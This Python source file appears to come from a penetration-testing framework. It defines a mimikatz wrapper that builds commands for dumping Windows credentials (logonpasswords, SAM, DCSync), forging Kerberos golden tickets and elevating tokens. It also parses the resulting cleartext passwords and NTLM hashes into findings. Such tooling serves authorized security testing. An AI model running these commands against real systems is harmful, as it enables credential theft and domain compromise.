"""Mimikatz post-exploitation tool definition - Windows credential extraction

This tool wraps mimikatz commands for credential harvesting in
authorized penetration testing engagements. Requires explicit
scope authorization and runs only against pre-approved Windows targets.
"""
import re
from typing import Dict, Any, List

from app.core.tool_engine.base_tool import BaseTool, ToolCategory
from app.core.tool_engine.tool_registry import ToolRegistry


@ToolRegistry.register
class MimikatzTool(BaseTool):
    name = "mimikatz"
    category = ToolCategory.EXPLOIT
    binary = "mimikatz"
    requires_root = True
    default_timeout = 120

    MODULES = {
        "sekurlsa_logonpasswords": "sekurlsa::logonpasswords",
        "sekurlsa_wdigest": "sekurlsa::wdigest",
        "sekurlsa_kerberos": "sekurlsa::kerberos",
        "sekurlsa_msv": "sekurlsa::msv",
        "sekurlsa_tspkg": "sekurlsa::tspkg",
        "lsadump_sam": "lsadump::sam",
        "lsadump_secrets": "lsadump::secrets",
        "lsadump_cache": "lsadump::cache",
        "lsadump_dcsync": "lsadump::dcsync",
        "vault_cred": "vault::cred",
        "vault_list": "vault::list",
        "kerberos_golden": "kerberos::golden",
        "kerberos_list": "kerberos::list",
        "token_elevate": "token::elevate",
        "privilege_debug": "privilege::debug",
    }

    def build_command(self, target: str, options: Dict[str, Any]) -> List[str]:
        modules = options.get("modules", ["privilege_debug", "sekurlsa_logonpasswords"])
        commands = []

        for mod in modules:
            cmd = self.MODULES.get(mod, mod)
            # dcsync needs domain/user
            if mod == "lsadump_dcsync":
                domain_user = options.get("domain_user", target)
                cmd = f'lsadump::dcsync /user:{domain_user}'
            # golden ticket needs extra params
            elif mod == "kerberos_golden":
                domain = options.get("domain", "")
                sid = options.get("sid", "")
                krbtgt_hash = options.get("krbtgt_hash", "")
                user = options.get("target_user", "Administrator")
                cmd = f'kerberos::golden /user:{user} /domain:{domain} /sid:{sid} /krbtgt:{krbtgt_hash}'
            commands.append(cmd)

        commands.append("exit")
        inline = " ".join(f'"{c}"' for c in commands)
        return ["mimikatz", inline]

    def parse_output(self, raw_output: str, exit_code: int) -> Dict[str, Any]:
        result: Dict[str, Any] = {
            "credentials": [],
            "hashes": [],
            "tickets": [],
            "tokens": [],
            "findings": [],
            "summary": {},
        }

        lines = raw_output.strip().split("\n")
        current_entry: Dict[str, str] = {}

        for line in lines:
            line = line.strip()

            # Username
            user_match = re.match(r"\*\s+Username\s*:\s*(.+)", line)
            if user_match:
                if current_entry and current_entry.get("username"):
                    result["credentials"].append(current_entry)
                current_entry = {"username": user_match.group(1).strip()}

            # Domain
            domain_match = re.match(r"\*\s+Domain\s*:\s*(.+)", line)
            if domain_match:
                current_entry["domain"] = domain_match.group(1).strip()

            # Password (cleartext)
            pass_match = re.match(r"\*\s+(Password|NTLM|SHA1|wdigest)\s*:\s*(.+)", line)
            if pass_match:
                key = pass_match.group(1).lower()
                value = pass_match.group(2).strip()
                if value and value != "(null)":
                    current_entry[key] = value

            # NTLM hash
            hash_match = re.match(r"\s*Hash NTLM:\s*([a-fA-F0-9]{32})", line)
            if hash_match:
                result["hashes"].append({
                    "type": "NTLM",
                    "hash": hash_match.group(1),
                    "username": current_entry.get("username", ""),
                })

            # Kerberos ticket
            if "kerberos" in line.lower() and "ticket" in line.lower():
                result["tickets"].append(line)

        if current_entry and current_entry.get("username"):
            result["credentials"].append(current_entry)

        # Filter out empty/null entries
        result["credentials"] = [
            c for c in result["credentials"]
            if c.get("username") and c["username"] != "(null)"
        ]

        result["summary"] = {
            "credentials_found": len(result["credentials"]),
            "hashes_found": len(result["hashes"]),
            "tickets_found": len(result["tickets"]),
            "cleartext_passwords": sum(1 for c in result["credentials"] if c.get("password")),
        }

        if result["credentials"]:
            result["findings"].append({
                "title": f"Mimikatz: {len(result['credentials'])} credentials extracted",
                "severity": "critical",
                "description": f"Extracted {len(result['credentials'])} credential sets including "
                               f"{result['summary']['cleartext_passwords']} cleartext passwords.",
                "source": "mimikatz",
            })

        if result["hashes"]:
            result["findings"].append({
                "title": f"Mimikatz: {len(result['hashes'])} NTLM hashes dumped",
                "severity": "critical",
                "description": f"Dumped {len(result['hashes'])} NTLM hashes that can be cracked or used for pass-the-hash attacks.",
                "source": "mimikatz",
            })

        return result
